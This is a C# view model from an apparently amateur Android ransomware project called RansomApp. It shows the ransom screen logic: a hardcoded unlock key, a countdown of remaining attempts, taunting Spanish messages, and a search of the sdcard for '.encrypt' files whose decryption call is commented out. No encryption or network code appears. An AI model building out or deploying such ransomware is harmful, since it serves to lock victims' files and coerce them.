using Prism.Commands;
using Prism.Navigation;
using RansomApp.Services.Decrypt;
using System.IO;

namespace RansomApp.ViewModels
{
    public class MainPageViewModel : ViewModelBase
    {
        public MainPageViewModel(INavigationService navigationService) : base(navigationService)
        {
            DecryptCommand = new DelegateCommand(Validate);

        }
        private void Validate()
        {
            if (key == "hola")
            {

                string[] files = SearchFiles("*.encrypt");


               /* DecryptService.CreateKey(key);
                foreach (string item in files)
                {
                    DecryptService.DecryptFile(item);
                }*/

                App.Current.MainPage.DisplayAlert("Felicidades!", "No vuelvas a confiar en sitios raros 😎", "OK GRACIAS DIOSITO");

            }
            else
            {
                App.Current.MainPage.DisplayAlert("ERROR", $"TE QUEDAN {oportunidades} OPORTUNIDADES, NO TRATES DE ENGAÑARME", "LO SIENTO");
                oportunidades--;
            }


            // return true;
        }
        private int oportunidades = 3;

        private string key;

        public string Key
        {
            get { return key; }
            set { key = value; }
        }

        public DelegateCommand DecryptCommand { get; }

        string[] SearchFiles(string extension)
        {
            string[] files = Directory.GetFiles(@"sdcard", extension, SearchOption.AllDirectories);

            return files;
        }

    }
}

